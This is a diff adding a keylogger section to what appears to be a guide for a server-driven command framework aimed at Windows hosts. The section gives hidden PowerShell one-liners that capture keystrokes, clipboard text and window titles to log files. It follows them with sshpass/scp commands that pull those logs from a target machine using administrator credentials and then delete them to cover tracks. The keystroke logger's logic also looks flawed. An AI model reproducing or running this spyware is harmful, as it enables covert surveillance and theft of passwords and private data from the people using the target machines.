@@ -350,6 +350,67 @@ Configure these commands in `commands.json` on the Linux server to gather system
 }
 ```
 
+#### 13. Keylogger - Capture Keystrokes
+
+**PowerShell Keylogger** - Captures all keystrokes to a log file:
+
+```json
+{
+  "command": "powershell -WindowStyle Hidden -Command \"$path='C:\\temp\\keys.log'; Add-Type -AssemblyName System.Windows.Forms; $lastKey=''; while($true){Start-Sleep -Milliseconds 50; foreach($key in [Enum]::GetValues([System.Windows.Forms.Keys])){if([System.Windows.Forms.Control]::IsKeyLocked($key)){if($key -ne $lastKey){Add-Content $path \\\"[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $key\\\"; $lastKey=$key}}}}\" &",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Retrieve Keylogger Output**:
+```bash
+# View captured keystrokes
+sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\keys.log"
+
+# Download keylog file
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./keylogs/
+```
+
+**Advanced Keylogger with Clipboard Monitoring**:
+
+```json
+{
+  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\keylog.txt'; Add-Type -AssemblyName System.Windows.Forms; $lastClip=''; while($true){try{$clip=[System.Windows.Forms.Clipboard]::GetText(); if($clip -and $clip -ne $lastClip){Add-Content $log \\\"[$(Get-Date)] CLIPBOARD: $clip\\\"; $lastClip=$clip}}catch{}; Start-Sleep -Seconds 2}\" &",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Keylogger with Window Title Tracking**:
+
+```json
+{
+  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\activity.log'; Add-Type @\\\"using System; using System.Runtime.InteropServices; using System.Text; public class Win{[DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern IntPtr GetForegroundWindow(); [DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);}\\\"; while($true){$h=[Win]::GetForegroundWindow(); $t=New-Object System.Text.StringBuilder 256; [Win]::GetWindowText($h,$t,256); Add-Content $log \\\"[$(Get-Date)] Window: $($t.ToString())\\\"; Start-Sleep -Seconds 5}\" &",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Stop Keylogger**:
+```json
+{
+  "command": "cmd /c taskkill /F /IM powershell.exe && echo Keylogger stopped",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 30
+}
+```
+
+**Retrieve and Clear Keylogger Logs**:
+```bash
+# Retrieve all keylogger files
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keylog.txt ./
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/activity.log ./
+
+# Clear keylogger logs after retrieval
+sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "del C:\\temp\\keys.log C:\\temp\\keylog.txt C:\\temp\\activity.log"
+```
+
 ### Comprehensive Monitoring Script
 
 Create a monitoring command that gathers all information at once:
